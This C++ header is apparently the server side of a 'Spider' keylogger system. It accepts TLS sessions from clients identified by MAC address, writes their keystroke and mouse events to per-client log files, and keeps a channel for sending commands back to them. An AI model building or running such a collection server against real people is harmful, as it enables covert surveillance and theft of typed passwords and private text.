//
// Created by doom on 28/09/17.
//

#ifndef SPIDER_SERVER_SPIDERCLIENTSESSION_HPP
#define SPIDER_SERVER_SPIDERCLIENTSESSION_HPP

#include <Server/CommandableSession.hpp>
#include <Logging/RotatingFileLogHandle.hpp>

namespace spi
{
    class SpiderClientSession : public CommandableSession
    {
    public:
        SpiderClientSession(net::IOManager &io, net::SSLContext &ctx, const fs::path &logRoot) :
            CommandableSession(io, ctx, "client-sessions"),
            _logHandle(logRoot),
            _commandConn(io, ctx)
        {
            _cmdHandler.onMessages(boost::bind(&SpiderClientSession::__logMessage, this, _1),
                                   proto::MessageType::MouseClick,
                                   proto::MessageType::MouseMove,
                                   proto::MessageType::KeyEvent,
                                   proto::MessageType::ReplyCode);
            _cmdHandler.onMessages(boost::bind(&SpiderClientSession::__handleHello, this, _1),
                                   proto::MessageType::Hello);
        }

        ~SpiderClientSession() noexcept override
        {
        }

        void startSession() noexcept
        {
            _log(logging::Level::Debug) << "Starting new session" << std::endl;
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&SpiderClientSession::handleHandshake, this, net::ErrorPlaceholder));
        }

    private:
        void __logMessage(const ILoggable &l)
        {
            if (unlikely(!_identified)) {
                _log(logging::Level::Warning) << "Rejecting log request from unidentified client" << std::endl;
            } else {
                _log(logging::Level::Debug) << l.stringify() << std::endl;
                _logHandle.appendEntry(l);
            }
        }

        void __handleHello(const ILoggable &l)
        {
            const proto::Hello &hello = static_cast<const proto::Hello &>(l);

            _log(logging::Level::Debug) << "Saying hello to " << hello.macAddress.toString() << std::endl;
            _log(logging::Level::Debug) << "Using version " << hello.version << std::endl;
            _logHandle.setHandleName(hello.macAddress.toString());
            _logHandle.setup();
            _id.setRaw(hello.macAddress.raw());
            _identified = true;
            _logHandle.appendEntry(hello);
//            _commandConn.asyncConnect(_conn.getRemoteAddress(), hello.port,
//                                      boost::bind(&SpiderClientSession::__handleCommandConnect, this,
//                                                  spi::net::ErrorPlaceholder));
        }

        /** Command connection helpers */

        void __handleCommandConnect(const ErrorCode &ec)
        {
            if (!ec) {
                _hasCommandConn = true;
                _log(logging::Level::Debug) << "Successfully obtained a command channel with client" << std::endl;
            } else {
                _log(logging::Level::Warning) << "Unable to obtain a command channel with client" << std::endl;
            }
        }

    public:
        void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
        {
            Buffer buff;

            l.serializeTypeInfo(buff);
            l.serialize(buff);
            _conn.writeSome(buff, ec);
        }

        bool hasCommandConn() const noexcept
        {
            return _hasCommandConn;
        }

        const ::net::MACAddress getID() const noexcept
        {
            return _id;
        }

    private:
        log::RotatingFileLogHandle _logHandle;
        bool _identified{false};
        ::net::MACAddress _id;

        net::SSLConnection _commandConn;
        bool _hasCommandConn{false};
    };
}

#endif //SPIDER_SERVER_SPIDERCLIENTSESSION_HPP
